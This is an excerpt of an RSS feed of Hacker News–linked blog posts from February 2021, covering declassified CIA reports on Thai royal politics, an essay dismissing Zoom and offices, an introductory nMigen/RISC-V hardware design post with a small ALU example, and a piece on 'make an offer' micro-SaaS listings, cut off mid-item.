data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d52f551d-236b-456b-a7a8-5d2e967ebba1_801x720.jpeg&quot;,&quot;height&quot;:720,&quot;width&quot;:801,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:108202,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>Prem and the prince</strong></h3><p>Between 1980 and 1988 Thailand was a faux-democracy in which royalist general Prem Tinsulanonda served as prime minister on behalf of Bhumibol‚Äôs faction among the royalist elite. Meanwhile, the king‚Äôs marriage to Queen Sirikit was unravelling, and army factionalism was rife. Sirikit became close to generals who wanted to replace Prem, and also sought to pressure Bhumibol to abdicate in favour of Vajiralongkorn, who had his own favourites among the political and military elite.</p><p>In April 1984, several US intelligence agencies produced&nbsp;<a href="https://www.cia.gov/readingroom/docs/CIA-RDP85T00310R000100040007-5.pdf">a secret joint report on Prem‚Äôs political prospects</a>. The report mentions that Vajiralongkorn was regarded as erratic and irresponsible.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa0afd855-f176-4a8d-aac2-51b6f99d0acd_1108x406.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa0afd855-f176-4a8d-aac2-51b6f99d0acd_1108x406.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a0afd855-f176-4a8d-aac2-51b6f99d0acd_1108x406.jpeg&quot;,&quot;height&quot;:406,&quot;width&quot;:1108,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:80135,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>The report also noted that Vajiralongkorn supported a right-wing rival of Prem. This was notorious ultranationalist politician Samak Sundaravej. Meanwhile, Sirikit had a favourite of her own ‚Äî the ambitious General Arthit Kamlang-ek.</p><p>These factors destabilised the country throughout the period of ‚ÄúPremocracy‚Äù</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F77008cf2-70c2-4946-b942-b8045848c7b7_1070x710.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F77008cf2-70c2-4946-b942-b8045848c7b7_1070x710.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/77008cf2-70c2-4946-b942-b8045848c7b7_1070x710.jpeg&quot;,&quot;height&quot;:710,&quot;width&quot;:1070,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:112079,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>The ‚ÄúDouble 9‚Äù coup of 1985</strong></h3><p>On September 9, 1985, a group of military officers linked to a faction known as the ‚ÄúYoung Turks‚Äù tried to seize power in an abortive uprising that was quickly suppressed. One suspected reason for the collapse of the attempted coup was that senior military officers favoured by Sirikit and Vajiralongkorn initially promised their support but panicked and backed out at the last minute.</p><p>The coup was suppressed by forces loyal to General Chavalit Yongchaiyudh. Five civilians were killed during the brief fighting, including two foreign journalists, Neil Davis and Bill Latch of NBC. The <a href="https://www.cia.gov/readingroom/docs/CIA-RDP04T00447R000302260001-1.pdf">CIA analysis of the abortive coup</a> is heavily redacted but nevertheless still useful.</p><p>One of the interesting elements of the analysis is that it explicitly discusses the splits in the royal family and their impact on events. The analysis mentions that Sirikit supported General Pichit Kullavanij, a rival to Prem and might a support a coup by him.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F176e2e58-42a9-4982-84ff-5e93da820e0f_1102x720.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F176e2e58-42a9-4982-84ff-5e93da820e0f_1102x720.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/176e2e58-42a9-4982-84ff-5e93da820e0f_1102x720.jpeg&quot;,&quot;height&quot;:720,&quot;width&quot;:1102,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:240502,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>The uncertain kingdom</strong></h3><p>In February 1987, combined U.S. intelligence agencies produced yet another report fretting that ‚ÄúThailand‚Äôs nagging political and economic problems ‚Äî and expected changes in leadership ‚Äî suggest that this important US ally may be headed for a period of ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://secretsiam.news/p/an-overview-of-declassified-cia-cables">https://secretsiam.news/p/an-overview-of-declassified-cia-cables</a></em></p>]]>
            </description>
            <link>https://secretsiam.news/p/an-overview-of-declassified-cia-cables</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181299</guid>
            <pubDate>Thu, 18 Feb 2021 15:54:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zoom is the solution nobody asked for, to a problem that doesn‚Äôt exist]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181268">thread link</a>) | @tompccs
<br/>
February 18, 2021 | https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html | <a href="https://web.archive.org/web/*/https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Disclaimer ‚Äì This post was poorly researched and most of the historical ‚Äòfacts‚Äô are pieced together from my own recollection, books I‚Äôve been reading and Wikipedia searches. Despite the lack of rigorous scholarship (or perhaps because of it) I expect the conclusion to be 100% correct.</em></p>

<p>When the pandemic is ‚Äúover‚Äù ‚Äì or, more precisely, when the right people decide to declare it ‚Äúover‚Äù and we are living in a world split between Covid-negative and Covid-positive countries with a several year life expectancy gap between them ‚Äì the consensus is that some things will go back to the way they were pre-2020, and others won‚Äôt. Whether or not you think white collar workers will still be working from home ‚Äì living in commuter belts, in or around small towns or in remoter parts of the country side with decent broadband ‚Äì or will have migrated back into the offices, city pubs and crammed trains, depends largely on whether or not you have a financial interest in the value of commercial real estate. One thing everyone seems to agree on, though, is that video conferencing technology, such as Zoom, has been, and will continue to be, central to this revolution in working patterns.</p>

<p>Whatever the future of white collar work holds, I feel I can confidently predict that video conferencing will be not-so-fondly remembered as a weird crutch that everyone was obsessed with for about 12-18 months, before people realised it actually serves no purpose at all.</p>

<p>To argue this point, I will ask the question ‚Äì why do we actually have offices in the first place? Who are they for? What problems do they solve? And which of those problems does video conferencing actually come close to addressing?</p>

<p>The history of bureaucratic white-collar work goes something like this: there are two main threads of office work which emerged around the Industrial Revolution ‚Äì state-administration, and the bourgeoise professions (accountants, lawyers, traders, etc). Of the two threads, state administration is the older: bureaucracies of this sort can be traced back to ancient Egypt. Hierarchies beyond a certain size need paperwork, because the people in charge need a way to have their wishes transmitted authentically without corruption (accidental of nefarious) to hundreds or thousands of  lowly peons. Hence the priestly, and later bureaucratic, class, tasked with the top-down administration of unwieldy empires and later nation-states according to the insights or whims of their rulers.</p>

<p>Obviously, this type of administration pre-dates the ‚Äúoffice‚Äù as we currently recognise it. There aren‚Äôt many western institutions which have been in continuous operation from medieval through to post-industrial times which we can analyse in this way, but one of them might be the British Parliament. Originally an ad-hoc assembly of the King‚Äôs noblemen, gathered as and when the King needed to raise some cash through taxation, this travelling parliament eventually evolved into the more stationary one we know today, where MPs have permanent offices and travel between their constituencies and the debating chambers according to how often they feel the need to escape from those people who elected them there in the first place. In 2021, those MPs are now spending a lot more time in their constituencies. Voting can now happen remotely, although MPs still have the option of attending debates in person. It‚Äôs hard to imagine British government functioning in quite the same way without the cut-and-thrust of rigorous parliamentary debate, but then again, it‚Äôs hard to see how any type of video conferencing solution could recreate it either (just look at what happened in this <a href="https://www.youtube.com/watch?v=jB3P_0GAi0I">disastrous parish council meeting</a>)</p>

<p>What of the rest of the state apparatus? The ambassadors, bureaucrats, etc? Well, to once again take an example from British history, a small cadre of Oxbridge-educated civil servants based in Whitehall, London, used to administer the largest empire in history with no more advanced technology than the telegraph. I can‚Äôt quite imagine a Zoom meeting between Prime Minister Disraeli and the governor-general of India, not to mention with the 120-or-so Indian noblemen scattered about the subcontinent, making this unwieldy task any easier.</p>

<p>So much for administering an empire. What about lower-level state administration ‚Äì things like welfare, sanitation, treasury, etc? You might not be surprised to learn that the primary reason for co-locating lots of bureaucrats is because‚Ä¶<em>that‚Äôs where the filing cabinets were!</em> If you needed to process a tax return, or look up some obscure by-law, you generally had to be co-located with reams and reams of paper containing this information. The fact that this constituted an ‚Äúoffice‚Äù is purely down to the fact that other people needed to be co-located with these files as well as you. The office was originally built for collaboration insofar as a library is built for meeting girls.</p>

<p>We‚Äôve still not explored the other thread of this ‚Äì the thread that runs from Venetian merchants to Google‚Äôs bean-bags and free lunches. This one is harder to explain. As the artisan evolved into the factory worker, so too did the other professionals ‚Äì lawyers, accountants, merchants ‚Äì evolve into the office worker. What was the rationale for this? Why should a lawyer or accountant, each of whom has a few assigned clients, need to work in an office with lots of other lawyers and accountants? Rather than being co-located with their filing cabinets, I suppose the reason is to allow them to share a pool of ancillary staff, like paralegals, typists, etc. However, as the digital revolution has swept through (and, since WWII, rising wages), much of the ancillary staff have been done away with altogether, or else morphed into something called ‚Äòmiddle management‚Äô. The function of middle management, of course, is the same as the ancillary staff: to help the professionals do their jobs better, although by tweaking their job description they were able to negotiate better pay.</p>

<p>If you need ancillary staff (read: middle management), then it stands to reason that you need an office, too. And if you don‚Äôt have an office, then you probably need something that will ‚Äòsimulate‚Äô an office. Here‚Äôs the problem: whereas the ancillary staff of old knew that their job was to type things up, keep appointment diaries and fetch post, middle management believes their job is to hold meetings. Therefore, synonymous with ‚Äòhome working‚Äô is ‚ÄòZoom meetings‚Äô.</p>

<p>I‚Äôve actually omitted a third thread of office history, which is the monastery (or university in 21st century parlance). Why the need to have a bunch of monks living together? In fact, the original Christian monk was a hermit, living in total solitude. But perhaps in not having a family such a degree of loneliness was too much to bear. Hence the monastery, where, as well as (or perhaps in the course of) worshipping God, monks partook in such pastimes as beer brewing, geometry, and science. The fact that big groups of celibate, literate men living in the same place led to all sorts of interesting by-products is perhaps the root of the modern idea of a university, and that legacy also dovetails into our modern corporate culture which has its roots in the 1980s, whose hallmarks are the borrowing of university lingo such as ‚Äòcampus‚Äô, and a growing obsession with a nicely marketable form of self-improvement which can be delivered through highly lucrative training contracts.</p>

<p>There is a fleeting sense in which a modern university, with students living in halls, unemployed and frugal, could look a bit like, if you squint, a short stint at a medieval monastery, and whatever value universities still hold is probably related to how long you can hold onto that mirage. But the modern office, with its 9-to-5 clock and day punctuated by meetings and the ambitious preoccupied by the arduous climb up the corporate hierarchy, is even further away. Perhaps the closest thing to the medieval monastery is the startup, with its ungodly hours and religious-fanatical devotion to the cause, and it‚Äôs probably no coincidence that working in a startup is generally seen as incompatible with having a social or family life. But no, other than the monastic startup-office-cum-bedsit, the office serves no creative purpose. The modern office is little more than a cargo-cult monastery.</p>

<p>Having read and of course also agreed with all of this, one can only wonder what function software such as Zoom can possibly serve. And I think the answer to this is similar to something we often see from new digital technology: the skeuomorphism of existing ‚Äòanalogue‚Äô concepts (ie, the modern ‚Äòdesktop‚Äô containing ‚Äòfiles‚Äô and ‚Äòdocuments‚Äô). Skeuomorphisms are almost always a temporary crutch, a cognitive bridge between the old inefficient way of doing something and the new but conceptually abstract way which will eventually replace it. Consider, for instance, the transition from written letters, to email, to instant messaging. Or how indeed the very idea of an email has become distinct in itself ‚Äì look at how email etiquette has gradually evolved from when you might write one as you would write a letter in the early 2000s to the modern ‚Äúsee attached. cheers, Tom‚Äù. Or look at social media, how Facebook was built on top of your real-world idea of ‚Äòfriends‚Äô by inventing the highly skeuomorphic (and somewhat autistic) concept of ‚Äòfriend requests‚Äô, before Instagram and Twitter developed the more digitally-native concept of ‚Äòfollowing‚Äô.</p>

<p>Zoom is the ‚Äòfriend request‚Äô of the office world. As our work places reverse the 150-year migration from our homes into purpose built offices, recall that that reversal is due to the sudden erosion of the logic which made us move into offices in the first place: record keeping and reference, ancillary staff, and creative collaboration. Zoom and video conferencing is a sticking plaster, and perhaps a desperate plea by the old guard to remind us of how much better ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html">https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html</a></em></p>]]>
            </description>
            <link>https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181268</guid>
            <pubDate>Thu, 18 Feb 2021 15:52:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing a RISC-V CPU, Part 1: Learning hardware design as a software engineer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181136">thread link</a>) | @lelf
<br/>
February 18, 2021 | https://mcla.ug/blog/risc-v-cpu-part-1.html | <a href="https://web.archive.org/web/*/https://mcla.ug/blog/risc-v-cpu-part-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
	
	<p><span>Tue 16 February 2021</span></p><p>I have no experience in digital logic design. That is, I didn't until I
recently decided that I would like to try designing my own CPU and running it
on an FPGA! If you too are a software engineer with a vague interest in
hardware design, I hope this series of posts about what I've learnt will be
helpful and interesting. In this first installment, I hope to answer these
questions:</p>
<ul>
<li>
<p>What is digital logic design?</p>
</li>
<li>
<p>How do I get started, and what tools might I use?</p>
</li>
</ul>
<p>In future installments, I will go into more detail about my CPU design and the
RISC-V architecture, as well as hopefully answering these questions:</p>
<ul>
<li>
<p>What about digital logic design is fundamentally different from software
  design?</p>
</li>
<li>
<p>What about digital logic design is similar to software design?</p>
</li>
</ul>
<p>You can see the code for my CPU at the time of writing
<a href="https://github.com/lochsh/riscy-boi/tree/47e94dc6e9665f73c871add002c34d1516fd5106">here</a>
or an up to date version <a href="https://github.com/lochsh/riscy-boi">here</a>.</p>
<h2>What is digital logic design?</h2>
<p>Digital logic design is designing logic circuits that operate on binary values.
The elementary components are logic gates: an AND gate, for example, has two
inputs and one output. The output is 1 iff<sup id="fnref:1"><a href="#fn:1">1</a></sup> both inputs are 1.</p>
<p>Typically, we design synchronous circuits which use flip-flops to store state,
and thereby synchronise the operation of the circuit to a common clock.
Flip-flops are composed of logic gates.</p>
<p>Analogue circuit design is concerned with the electronic components that make
up logic gates, like transistors and diodes. This level of abstraction is often
needed for applications dealing directly with signals derived from analogue
sensors, like radio receivers. When designing a CPU, this level of abstraction
would not be feasible: modern CPUs can have billions of transistors!</p>
<p>Instead, we use tools that can translate our digital logic design into
different useful formats: the configuration of an FPGA (see below); a
simulation; silicon layout.</p>
<h2>What is an FPGA and why are they used?</h2>
<p>We noted above that the same digital logic design tools can be used whether we
are creating a custom ASIC to be made into silicon, or configuring an FPGA. A
Field-Programmable Gate Array is an integrated circuit containing an array of
programmable logic blocks. You could imagine it is as a big array of logic
gates that can be connected together in various ways.</p>
<p>Making a custom chip generally costs millions, and of course once your chip is
manufactured it cannot be changed. Thus, generally FPGAs are used when:</p>
<ul>
<li>
<p>You cannot afford to create a custom ASIC due to lack of capital (e.g. if
  you're just some hacker like me and not ARM or Intel)</p>
</li>
<li>
<p>You cannot afford to create a custom ASIC because your volume is too low to
  make it worth the high one-off costs (e.g. if you are making a small quantity
  of MRI machines with custom data acquisition hardware)</p>
</li>
<li>
<p>You need the flexibility</p>
</li>
</ul>
<p>The downsides? FPGAs have a much higher per-chip cost, and they are generally
much slower as a consequence of being able to connect logic blocks together in
very flexible ways. In contrast, a custom design can be reduced to the minimum
number of transistors, with no concern for flexibility.</p>
<p>I think it's helpful context to compare the custom ASIC design process against
that of an FPGA design:</p>
<ul>
<li>
<p><span>Logic design</span>: just like we'd do for an FPGA, the logic design of an ASIC is
  done in a hardware description language.</p>
</li>
<li>
<p><span>Verification</span>: FPGA designs may well be verified, but you might expect the
  process for an ASIC design to be more rigorous ‚Äì after all, the design
  can't be changed once manufactured! Often verification will involve formally
  verifying<sup id="fnref:2"><a href="#fn:2">2</a></sup> parts of the design.</p>
</li>
<li>
<p><span>Synthesis</span>: This creates a <em>netlist</em>: a list of logic blocks and their
  connections. The connections are called <em>nets</em>, and the blocks are called
  <em>cells</em>. For both FPGAs and ASICs, the cells are vendor-specific.</p>
</li>
<li>
<p><span>Placement and routing</span> (P&amp;R): for an FPGA, this involves mapping the logic
  blocks described in the netlist to actual blocks in the FPGA. The resulting
  binary is often called a <em>bitstream</em>.  For an ASIC, this involves deciding
  where to place the cells on the silicon, and how to connect them up. Both
  applications generally use automated optimisation tools for this.</p>
</li>
</ul>
<h2>What tools do I need?</h2>
<h3>A hardware description language: I am using <a href="https://github.com/nmigen/nmigen">nMigen</a><sup id="fnref:3"><a href="#fn:3">3</a></sup></h3>
<p>You may have heard of Verilog or VHDL: both popular hardware description
languages (HDLs). I use "popular" here to mean widely used, not widely loved.</p>
<p>I won't pretend to know much about these tools: I only know that smarter people
than me with vast logic design experience have a lot of hate for them.
Due to the problems with Verilog and other similar tools, there have been
various attempts at making more useful and friendlier alternatives.  nMigen is
one such project, which creates a domain-specific language in Python. In their
own words:</p>
<blockquote>
<p>Despite being faster than schematics entry, hardware design with Verilog and
VHDL remains tedious and inefficient for several reasons. The event-driven
model introduces issues and manual coding that are unnecessary for
synchronous circuits, which represent the lion's share of today's logic
designs. Counterintuitive arithmetic rules result in steeper learning curves
and provide a fertile ground for subtle bugs in designs. Finally, support for
procedural generation of logic (metaprogramming) through "generate"
statements is very limited and restricts the ways code can be made generic,
reused and organized.</p>
<p>To address those issues, we have developed the nMigen FHDL, a library that
replaces the event-driven paradigm with the notions of combinatorial and
synchronous statements, has arithmetic rules that make integers always behave
like mathematical integers, and most importantly allows the design's logic to
be constructed by a Python program. This last point enables hardware
designers to take advantage of the richness of the Python language‚Äîobject
oriented programming, function parameters, generators, operator overloading,
libraries, etc.‚Äîto build well organized, reusable and elegant designs.</p>
</blockquote>
<p>If, like me, you've never used Verilog, then not all of this will have more
than abstract meaning to you. But it certainly sounds promising,
and I can attest that it has been very straightforward to get started with
logic design without the reportedly large barrier of grappling with Verilog. I
would recommend it, particularly if you are already familiar with Python!</p>
<p>The only downside I can think of is that nMigen is still in development, and
in particular the documentation is not complete. There is a helpful community
at #nmigen on <a href="https://mcla.ug/blog/chat.freenode.net">chat.freenode.net</a>.</p>
<h3>A wave viewer for inspecting simulations: I am using <a href="http://gtkwave.sourceforge.net/">GTKWave</a></h3>
<p>nMigen provides simulation tooling: I use it in my tests, written using
<code>pytest</code>. I record the signals during these tests and view them in a wave
viewer to help debug.</p>
<p><img alt="gtkwave" src="https://mcla.ug/blog/images/gtkwave.png" title="A screenshot of GTKWave"></p>
<h3>Optional: An FPGA dev board. I am using a myStorm BlackIce II</h3>
<p>You don't need an FPGA dev board to create your own CPU. You could do
everything in simulation! The fun of having a board to work with, for me, is
being able to flash LEDs and see my design in action.</p>
<p>Of course, if you were creating something more useful than my very basic CPU,
then you would probably want some hardware to run it on, and this would be less
"optional"!</p>
<h2>Getting started with nMigen</h2>
<p>Rather than immediately trying to design a CPU, I started by making an
Arithmetic Logic Unit (ALU) in nMigen. The ALU is a key piece of any CPU design
that I have seen: it performs arithmetic operations.</p>
<p>Why start with this? I knew I would need an ALU for my CPU; I knew I could make
a simple one; I knew that the feeling of making something is an important
motivator when starting a new project!</p>
<p>My design looked something like this:</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>"""</span><span>Arithmetic Logic Unit</span><span>"""</span>
<span id="L2"> 2 </span><span>import</span> enum
<span id="L3"> 3 </span>
<span id="L4"> 4 </span><span>import</span> nmigen <span>as</span> nm
<span id="L5"> 5 </span>
<span id="L6"> 6 </span>
<span id="L7"> 7 </span><span>class</span> <span>ALUOp</span><span>(</span>enum<span>.</span>IntEnum<span>)</span><span>:</span>
<span id="L8"> 8 </span>    <span>"""</span><span>Operations for the ALU</span><span>"""</span>
<span id="L9"> 9 </span>    ADD <span>=</span> <span>0</span>
<span id="L10">10 </span>    SUB <span>=</span> <span>1</span>
<span id="L11">11 </span>
<span id="L12">12 </span>
<span id="L13">13 </span><span>class</span> <span>ALU</span><span>(</span>nm<span>.</span>Elaboratable<span>)</span><span>:</span>
<span id="L14">14 </span>    <span>"""</span>
<span id="L15">15 </span><span>    Arithmetic Logic Unit</span>
<span id="L16">16 </span>
<span id="L17">17 </span><span>    * op (in): the opcode</span>
<span id="L18">18 </span><span>    * a (in): the first operand</span>
<span id="L19">19 </span><span>    * b (in): the second operand</span>
<span id="L20">20 </span>
<span id="L21">21 </span><span>    * o (out): the output</span>
<span id="L22">22 </span><span>    </span><span>"""</span>
<span id="L23">23 </span>
<span id="L24">24 </span>    <span>def</span> <span>__init__</span><span>(</span>self<span>,</span> width<span>)</span><span>:</span>
<span id="L25">25 </span>        <span>"""</span>
<span id="L26">26 </span><span>        Initialiser</span>
<span id="L27">27 </span>
<span id="L28">28 </span><span>        Args:</span>
<span id="L29">29 </span><span>            width (int): data width</span>
<span id="L30">30 </span><span>        </span><span>"""</span>
<span id="L31">31 </span>        self<span>.</span>op <span>=</span> nm<span>.</span>Signal<span>()</span>
<span id="L32">32 </span>        self<span>.</span>a <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L33">33 </span>        self<span>.</span>b <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L34">34 </span>        self<span>.</span>o <span>=</span> nm<span>.</span>Signal<span>(</span>width<span>)</span>
<span id="L35">35 </span>
<span id="L36">36 </span>    <span>def</span> <span>elaborate</span><span>(</span>self<span>,</span> _<span>)</span><span>:</span>
<span id="L37">37 </span>        m <span>=</span> nm<span>.</span>Module<span>()</span>
<span id="L38">38 </span>
<span id="L39">39 </span>        <span>with</span> m<span>.</span>Switch<span>(</span>self<span>.</span>op<span>)</span><span>:</span>
<span id="L40">40 </span>            <span>with</span> m<span>.</span>Case<span>(</span>ALUOp<span>.</span>ADD<span>)</span><span>:</span>
<span id="L41">41 </span>                m<span>.</span>d<span>.</span>comb <span>+=</span> self<span>.</span>o<span>.</span>eq<span>(</span>self<span>.</span>a <span>+</span> self<span>.</span>b<span>)</span>
<span id="L42">42 </span>            <span>with</span> m<span>.</span>Case<span>(</span>ALUOp<span>.</span>SUB<span>)</span><span>:</span>
<span id="L43">43 </span>                m<span>.</span>d<span>.</span>comb <span>+=</span> self<span>.</span>o<span>.</span>eq<span>(</span>self<span>.</span>a <span>-</span> self<span>.</span>b<span>)</span>
<span id="L44">44 </span>        <span>return</span> m
</pre>
</div>

<p>As you can see, we've created a lot of nMigen <code>Signal</code> instances to represent
well...the signals that define the interface to our ALU! But what is this
<code>elaborate</code> method? My understanding is that "elaboration" is the name for the
first step in synthesising the netlist (see above). The idea in the nMigen code
above is that we've created some <em>elaboratable</em> structure (by inheriting from
<code>nm.Elaboratable</code>), i.e. something that describes digital logic we want to
synthesise. The <code>elaborate</code> method describes that digital logic. It has to
return an nMigen <code>Module</code>.</p>
<p>Let's have a closer look at the contents of the <code>elaborate</code> method. The
<code>Switch</code> will create some kind of decision logic in the synthesised design.
But what is <code>m.d.comb</code>? nMigen has the concept of synchronous (<code>m.d.sync</code>)
and combinatorial<sup id="fnref:4"><a href="#fn:4">4</a></sup> (<code>m.d.comb</code>) control domains. From the nMigen
<a href="https://nmigen.info/nmigen/latest/lang.html#lang-domains">docs</a>:</p>
<blockquote>
<p>A control domain is a named group of signals that change their value in
identical conditions.</p>
<p>All designs have a single predefined <em>combinatorial domain</em>, containing all
signals that change immediately when any value used to compute them changes.
The name comb is reserved for the combinatorial domain.</p>
<p>A design can also have any amount of user-defined <em>synchronous domains</em>, also
called clock domains, containing signals that change when a specific edge
occurs on the domain‚Äôs ‚Ä¶</p></blockquote></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mcla.ug/blog/risc-v-cpu-part-1.html">https://mcla.ug/blog/risc-v-cpu-part-1.html</a></em></p>]]>
            </description>
            <link>https://mcla.ug/blog/risc-v-cpu-part-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181136</guid>
            <pubDate>Thu, 18 Feb 2021 15:44:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One micro-angel's trash is another's come-up]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181087">thread link</a>) | @eyaltoledano
<br/>
February 18, 2021 | https://microangel.so/p/make-an-offer-listings?r=46t31&utm_campaign=post&utm_medium=web&utm_source=hackernews | <a href="https://web.archive.org/web/*/https://microangel.so/p/make-an-offer-listings?r=46t31&utm_campaign=post&utm_medium=web&utm_source=hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F16155a11-ae73-428f-b133-29ad0f0784c9_1020x442.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F16155a11-ae73-428f-b133-29ad0f0784c9_1020x442.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/16155a11-ae73-428f-b133-29ad0f0784c9_1020x442.png&quot;,&quot;height&quot;:442,&quot;width&quot;:1020,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:57295,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Microangels have some pretty polarizing opinions about businesses listed as ‚Äòopen for offers.‚Äô</p><p>In fact, most aren‚Äôt reacting so well to these listings. The general consensus is that haggling sucks when it comes to investing in Micro-SaaS. </p><p>Investors want to have access to metrics that help them decide whether to make an offer as they scroll through deals.</p><p>I empathize with the inconvenience, but that‚Äôs all it is.</p><div><p>It‚Äôs true, you need as much information as you can to make a decision. It‚Äôs natural to expect someone looking to sell their product to be able to answer questions about the state of the product, the unit economics, marketing funnels, and so on. </p><p>Specifically, you want them to answer questions that help <em>you</em> reach a decision to invest/buy.</p></div><p>Generally, most of us have an idea of what we‚Äôre looking for in a deal. But each micro-angel has a different style, and all want as much information as possible when browsing through deals.</p><p>A seller who asks buyers to ‚ÄòMake an Offer‚Äô for their business is making a conscious choice to relinquish control over the starting price. They‚Äôre giving up the price anchoring in your favour.</p><p>I can understand the initial reaction to ‚Äòmake an offer‚Äô listings. If a product is listed without a price, it instantly spells <em>complicated order</em> for a potential buyer because that buyer has to determine that price to offer and then prepare to defend it.</p><p>That‚Äôs how most microangels seem to react, and I just don‚Äôt understand why.</p><p>Sure. It sucks to go through deals with completely made up terms. </p><p>Yep. It‚Äôs more work to have to actually <em>talk</em> to the person selling their business. It can even be a grind provided volume across several marketplaces.</p><p>There‚Äôs no two ways around it ‚Äî it takes more time. </p><p>But, like, seriously‚Ä¶ </p><p>Are you kidding me? </p><p>Buying a business isn‚Äôt like buying something on Amazon. You can only be so <em>transactional</em> about it. </p><p>Marketplaces like <a href="https://www.microacquire.com/?utm_source=microangel">MicroAcquire</a> manage to attract interesting and diverse deal flow because they‚Äôre founder/seller-first. </p><p>In the case of micro acquisitions, sellers tend to be developers who have managed to create something valuable/profitable all on their own.</p><p>They don‚Äôt have the pedigree, experience or time/patience to be meticulous about their reporting. Some shoot completely from the hip, and to me, <strong>that is a</strong> <strong>massive advantage</strong> <strong>as a micro-angel</strong>.</p><p>Story time:</p><p>One of my favourite humans to follow on Twitter is self-made real estate investor/developer <a href="https://twitter.com/sweatystartup">Nick Huber</a>. The man‚Äôs a machine. </p><p>He started his real estate career by making a deliberate choice: to focus on a class of properties that would produce high margins, without having to deal with people (as a landlord must do), with strong cash-on-cash returns on his investments. 